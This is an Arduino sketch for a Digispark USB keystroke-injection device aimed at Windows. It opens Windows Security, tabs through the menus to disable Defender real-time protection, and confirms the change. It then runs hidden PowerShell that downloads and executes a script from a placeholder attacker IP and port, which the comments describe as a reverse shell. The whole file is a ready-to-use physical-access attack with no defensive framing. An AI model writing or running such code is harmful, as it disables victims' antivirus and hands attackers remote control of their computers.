#include "DigiKeyboard.h"

// Key code definitions
#define KEY_TAB 43
#define KEY_ENTER 40
#define KEY_R 21
#define KEY_SPACE 44

void setup() {
  // Initialize the keyboard
  DigiKeyboard.sendKeyStroke(0);

  // Open the Start menu
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);

  // Open Windows security settings
  DigiKeyboard.print("ms-settings:windowsdefender");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // Wait for the settings window to open

  // Navigate and select "Virus & threat protection" (press TAB 4 times)
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(1000);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Select the panel
  DigiKeyboard.delay(5000); // Wait for the virus & threat protection window to open

  // Move down 4 panels and click on "Virus & threat protection settings"
  for (int i = 0; i < 4; i++) {
    DigiKeyboard.sendKeyStroke(KEY_TAB);
    DigiKeyboard.delay(1000);
  }
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000); // Wait for the settings window to open

  // Disable real-time protection
  DigiKeyboard.sendKeyStroke(KEY_SPACE); // Disable real-time protection
  DigiKeyboard.delay(3000);

  // Confirm the action
  DigiKeyboard.sendKeyStroke(KEY_TAB); // First TAB press
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_TAB); // Second TAB press
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER); // Confirm with ENTER
  DigiKeyboard.delay(5000);

  // Open a shell and start a reverse shell (using hak5 and nishang method)
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(1000);
  DigiKeyboard.print("powershell -windowstyle hidden -command \"IEX (New-Object Net.WebClient).DownloadString('http://<YOUR-IP>:<YOUR-PORT>/payload.ps1');\"");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);

  // Turn on the red light
  pinMode(1, OUTPUT);
  digitalWrite(1, HIGH);
}

void loop() {
  // No action needed in the loop
  for (;;) {
    // Stop the script from running again
  }
}
